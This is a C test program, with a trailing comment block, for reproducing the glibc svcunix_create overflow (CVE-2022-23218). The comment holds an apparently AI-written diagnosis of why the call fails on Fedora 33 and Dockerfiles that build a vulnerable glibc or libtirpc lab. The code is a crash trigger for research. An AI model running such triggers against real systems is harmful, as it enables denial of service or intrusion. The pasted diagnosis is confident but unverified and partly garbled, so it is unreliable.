#include <stdio.h>
#include <string.h>
#include <rpc/rpc.h>
#include <rpc/svc.h>
#include <sys/un.h>
#include <errno.h>


int main() {
    struct netconfig config;
    struct t_bind bind_addr;
    struct sockaddr_un addr;
    SVCXPRT *xprt;

    // Fill netconfig with dummy values
    memset(&config, 0, sizeof(config));
    config.nc_device = "/dev/null";  // dummy

    // Create an overly long path (> 108 bytes for AF_UNIX)
    char canary_before[16] = "CANARYBEFORE123";
    char long_path[1000];
    char canary_after[16] = "CANARYAFTER12345";
    memset(long_path, 'A', sizeof(long_path) - 1);
    long_path[sizeof(long_path) - 1] = '\0';

    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, long_path, sizeof(addr.sun_path));

    bind_addr.addr.maxlen = sizeof(addr);
    bind_addr.addr.len = sizeof(addr);
    bind_addr.addr.buf = (char *)&addr;

    // This call triggers the vulnerability on vulnerable versions of glibc
    xprt = svcunix_create(RPC_ANYSOCK, 0, 0, long_path);

    if (xprt == NULL) {
        perror("svcunix_create failed");
        printf("errno: %d\n", errno);
    } else {
        printf("svcunix_create succeeded (unexpected on patched systems)\n");
        // Do something with xprt to trigger use of corrupted data
        svc_destroy(xprt);

        printf("svc_destroy called\n");
    }

    return 0;
}

/*
PROBLEM:
‚úÖ You're using Fedora 33 with glibc 2.32.

‚ùå TI-RPC on your system doesn't support UNIX domain sockets, or it was compiled without that support.

‚ùå So svcunix_create() fails before it reaches the vulnerable code path in glibc.

‚úÖ This confirms you're not triggering CVE-2022-23218, even if glibc were vulnerable.

The failure is happening inside the libtirpc implementation of svcunix_create() ‚Äî not glibc.

Fedora, Alpine, and most modern Linux distros use TI-RPC, and in many builds:

üîí svcunix_create() is disabled or stubbed out
‚ùå It returns EOPNOTSUPP without ever calling into glibc's vulnerable code.


How to fix this:

Option 1: Use glibc's native RPC (not libtirpc)
Option 2: Patch libtirpc to enable UNIX socket support
Option 3: Build glibc with bundled SunRPC

3:
FROM fedora:33

# Install build tools and dependencies
RUN dnf install -y gcc make wget tar bison gawk diffutils texinfo \
    rpcgen glibc-static rpcbind patch

# Set working directory
WORKDIR /root

# Download glibc 2.32
RUN wget http://ftp.gnu.org/gnu/libc/glibc-2.32.tar.gz && \
    tar -xf glibc-2.32.tar.gz

# Build glibc 2.32 with internal SunRPC enabled
RUN mkdir /root/glibc-build && cd /root/glibc-build && \
    ../glibc-2.32/configure --prefix=/opt/glibc-2.32 \
    --enable-obsolete-rpc && \
    make -j$(nproc) && make install

# Set environment to use new glibc
ENV LD_LIBRARY_PATH=/opt/glibc-2.32/lib
ENV PATH=/opt/glibc-2.32/bin:$PATH

# Copy your vulnerable program
COPY vulnerability_example.c /root/vulnerability_example.c

# Compile using glibc SunRPC (no tirpc)
RUN gcc -o vuln /root/vulnerability_example.c -Wl,--rpath=/opt/glibc-2.32/lib

# Default command
CMD rpcbind -w & ./vuln

2:
FROM fedora:33

# Install build tools
RUN dnf install -y gcc make wget git autoconf automake libtool \
    glibc-devel glibc-static rpcbind pkgconfig

# Get libtirpc with UNIX socket support
WORKDIR /root
RUN git clone https://github.com/thkukuk/libtirpc.git && cd libtirpc && \
    ./bootstrap && \
    ./configure --prefix=/usr/local --enable-unix-socket && \
    make -j$(nproc) && make install

# Set library path to new libtirpc
ENV LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH

# Copy your vulnerable program
COPY vulnerability_example.c /root/vulnerability_example.c

# Compile against custom libtirpc
RUN gcc -o vuln /root/vulnerability_example.c -ltirpc -lrpcsvc

CMD rpcbind -w & ./vuln


commands:
docker build -t vuln-glibc-native .
docker run --rm -it --privileged vuln-glibc-native
*/